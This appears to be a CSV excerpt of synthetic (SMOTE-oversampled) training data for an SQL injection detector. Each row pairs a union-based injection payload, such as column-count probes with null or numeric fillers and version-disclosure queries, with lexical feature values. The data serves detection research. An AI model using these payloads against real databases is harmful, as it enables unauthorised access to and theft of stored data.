id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000445,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000462,0.3330795795162265,64.21177092066299,15.0,3.041150767557961,48.56941673653039,1.0,4.0,10.642354184132598,0.7563320811172023,0.015595685315284907,0.0623827412611396,0.1656894923063732,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.642354184132598,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000617,0.33618489919459166,71.82123622857468,23.0,3.86697902109215,14.0,37.45698898285974,8.0,12.364247245714935,0.19544690942856335,0.5207901293877666,0.11168394824489332,0.17207901293877667,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,7.364247245714935,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000447,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,5.498995776581348,74.3345323373566,29.067625869885283,4.246268036714938,30.60143880482793,21.334532337356606,14.199280597586036,8.199280597586036,0.41099466016317127,0.28639448786088867,0.19169819082603293,0.11091266114990712,3.2669064674713213,0.0,0.7330935325286787,0.0,0.0,1.0,0.0,0.7330935325286788,0.0,0.0,1.0000000000000004,2.4661870650573574,1.0,0.0,0.0,0.7330935325286787,0.0,1.0,0.7330935325286787,0.0,0.0,0.0,0.0,1.7330935325286787,1.0,0.7330935325286787,0.0,0.2669064674713212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7330935325286787
SMOTE_000448,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000081,0.41798952408093276,72.84647903854984,31.846479038549845,4.4033016310417885,44.0,2.0000000000000018,16.0,10.846479038549848,0.6040249091141184,0.02745567768700538,0.21964542149604308,0.14887399170283305,0.0,0.0,2.0,0.0,1.1535209614501518,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.846479038549848,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000449,attack,union,"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",nearest_attack_euclidean,R000742,0.481147191663339,71.24649953831482,18.89859981532593,3.35794391895112,14.0,41.79719963065186,4.0,11.449299907662965,0.19673893585264246,0.5863977267885596,0.05621112452932642,0.1606522128294715,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.449299907662965,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000450,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000240,0.2690671602393094,70.83423612851433,27.0,4.212861884824471,35.67388902811472,10.160347100399616,15.0,10.0,0.5034163750988159,0.14363712655367072,0.211767899008508,0.14117859933900537,3.0,0.0,2.1657638714856593,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.8342361285143411,5.165763871485659,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000451,attack,union,-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,nearest_attack_euclidean,R000716,0.43143385778847904,72.18683356211447,27.437366712422893,4.273093767086839,29.0,17.74946684969158,15.0,10.437366712422895,0.40220606222832006,0.24523301761611027,0.20803761839395865,0.14452330176161102,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.4373667124228948,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000452,attack,union,"1"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000600,1.3238100113203597,59.165599560171415,15.458600109957146,3.137532404132549,44.165599560171415,1.0,4.0,10.0,0.746184640035252,0.01692102399764986,0.06768409599059948,0.16921023997649864,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.45860010995714656,0.0,6.541399890042854,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.05088919836796763,76.9182789379341,27.0,3.944496740715519,40.0,3.0,23.0,10.918278937934106,0.520039105003868,0.03900293287529011,0.2990224853772241,0.14193547674361773,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000454,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000123,0.09364046235235998,77.0,22.739576598030425,3.8054565073163498,14.0,32.0,18.0,13.0,0.18181818181818182,0.4155844155844156,0.23376623376623376,0.16883116883116883,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000455,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000666,0.09958506752303238,60.524254222846416,23.09514915543072,3.8820278497659944,30.61940337827713,9.0,14.0,6.9048508445692836,0.5057177181401248,0.14879441217634143,0.23145797449653108,0.11402989518700274,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.904850844569283,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000456,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000190,0.46258934954735714,61.25052729679145,21.54989454064171,3.866686455474152,14.0,33.800421837433156,4.0,9.450105459358289,0.22894401955638766,0.5514322073387792,0.06541257701611075,0.15421119608872247,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.450105459358289,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000457,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000156,0.21520546021999895,67.96512477290067,21.206975045419867,3.7037987099213296,38.17209981832054,9.0,14.0,6.793024954580135,0.5614209740310214,0.13254390331609917,0.20617940515837652,0.09985571749450285,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.793024954580134,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000458,attack,union,"1   )    )    as cvid where 4381  =  4381 union all select null,null--",nearest_attack_euclidean,R000674,0.9942506510277223,66.53936413861074,23.011246896745927,3.847375024583876,33.0,9.0,19.033740690237778,5.505623448372963,0.4973244860376067,0.1356339507375291,0.28446617625106757,0.08257538697379657,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.505623448372963,0.0,0.0,1.0000000000000004,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000459,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000247,0.4999070681577463,64.81529236968784,26.265067469927963,4.044122002873008,23.530134939855923,19.02008995990395,15.510044979951974,6.755022489975987,0.3622103921572211,0.2933316229624898,0.2400102622250612,0.10444772265522789,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7550224899759876,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000460,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000620,0.18351474739724657,77.97708008515414,15.0,3.0682248199005606,46.781664068123305,1.0,18.0,12.195416017030826,0.5998166691999374,0.012832264794875814,0.23098076630776457,0.15637029969742225,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.195416017030826,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000461,attack,union,"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",nearest_attack_euclidean,R000580,0.5541477593856728,68.0,25.0,4.0091685921816955,19.0,31.20583482491764,10.794165175082359,7.0,0.27941176470588236,0.4589093356605536,0.15873772316297588,0.10294117647058823,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.19854129377058993,0.0,0.0,3.8014587062294103,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.19854129377058982,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000462,attack,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",nearest_attack_euclidean,R000048,0.07922109890769775,76.0,27.88678665367156,3.955452276560469,40.0,2.1132133463284397,23.0,10.88678665367156,0.5263157894736842,0.027805438767479485,0.3026315789473684,0.1432471928114679,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,7.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000463,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R000451,0.029382948179208383,73.06697553586179,25.0,3.9488031860887265,19.133951071723562,31.910699285517627,14.044650357241187,7.977674821379407,0.26180711843086624,0.4367948505218474,0.1921993184168244,0.10919871263046185,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.9776748213794066,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000464,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000261,0.9985220617062288,77.24760783961665,21.749202613205547,3.6869698728212685,48.498405226411094,9.0,10.0,9.749202613205547,0.6277765964640083,0.11667021060797533,0.12963356734219483,0.1259196255858216,0.3746013066027738,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,6.374601306602774,3.0,0.3746013066027739,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000465,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000067,0.30399486546406534,75.47873928112716,25.0,3.8051334163903023,40.0,3.0,24.0,8.478739281127158,0.5299737594306866,0.039748031957301505,0.31798425565841193,0.11229395295359992,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000466,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000107,2.1995218366684877,75.79562492310814,29.42416670084083,4.152671273629066,40.0,2.0000000000000018,20.507708273528547,13.287916649579586,0.5295072338292359,0.02647536169146178,0.2688624919307899,0.17515491254851234,3.0,1.2879166495795848,2.0,0.0,1.0,1.0,0.0,1.287916649579585,0.0,1.0,1.0000000000000004,4.0,1.0,0.6439583247897926,1.0,0.0,0.0,1.0,0.6439583247897925,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000467,attack,union,"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",nearest_attack_euclidean,R000571,0.2710621096226774,75.43462683875052,21.286925367750104,3.521476977524391,14.0,41.14770147100042,8.0,12.286925367750104,0.18575354503207198,0.5452522810988727,0.10614488287546969,0.1628492909935856,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.286925367750104,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000468,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000153,0.23565900370579992,58.86045501351178,18.227908997297643,3.553361614512288,14.0,31.088364010809425,4.0,9.772091002702355,0.23816776660934397,0.5278082667321783,0.06804793331695541,0.16597603334152228,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.772091002702356,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000469,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R000160,0.0,74.0,22.0,3.531597469539237,14.0,44.0,4.0,12.0,0.18918918918918917,0.5945945945945946,0.05405405405405406,0.16216216216216217,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000470,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,0.11842822925353323,60.63238515359977,15.0,3.031466442177306,46.50590812287981,1.0,4.0,9.126477030719954,0.7669909667454358,0.016504516627282112,0.06601806650912843,0.15048645011815368,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.126477030719954,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000471,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000738,0.5429696932404544,77.55989308270847,27.511978616541697,4.0104496420259,25.0,22.04791446616678,22.0,8.511978616541695,0.32266711215538135,0.2837326205513898,0.28394705869673564,0.10965320859649322,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.511978616541695,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000472,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000240,1.0248252194428469,75.11169932696791,27.0,4.208894422308441,36.43519902104423,12.747100428293152,15.0,10.929399877630528,0.4799338008802516,0.17398762623439756,0.20076270019320658,0.14531587269214424,3.0,0.0,2.535300061184736,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.3940998164457916,5.535300061184736,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000473,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,0.2860530587216305,71.12316411672303,23.33694923501691,3.816921990281736,39.224632823344606,9.0,14.898531293378426,8.0,0.5521287316217722,0.12676634338383796,0.20842373087542274,0.1126811941189671,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.112316411672303,0.0,0.0,3.887683588327697,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000474,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000209,0.32248597346448193,57.64605815753393,23.0,3.9468559823853266,14.0,21.316846526027142,14.0,8.329211631506785,0.24325386001010688,0.3690931622678107,0.24325386001010685,0.14439911771197558,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.3292116315067855,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000475,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.31765165731703937,68.29353134994679,15.0,2.951209024487212,52.63482507995744,1.0,4.0,10.65870626998936,0.770678475318658,0.01466076234067104,0.05864304936268411,0.1560177129779869,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.65870626998936,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000476,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000734,0.23775672877762621,63.22141925307082,21.0,3.760451024153186,14.0,20.977135402456653,18.0,10.244283850614163,0.22168996881487926,0.3312840659342552,0.2850299599048448,0.16199600534602068,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.2442838506141634,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000477,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000175,0.6323865741825534,71.35511919413575,22.0,3.6889743714741723,14.0,33.28976161172851,12.06535758240724,12.0,0.19623578001628958,0.46696409163335484,0.1685980311935359,0.16820209715681964,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6775595970678734,1.0,0.0,6.322440402932127,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000478,attack,union,"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",nearest_attack_euclidean,R000474,0.3359119419495762,76.09413837878697,20.781172324242608,3.6808628716749907,14.0,40.87531070302957,8.0,13.218827675757392,0.18411367711616378,0.5369804612626232,0.10520781549495073,0.17369804612626233,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.218827675757392,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
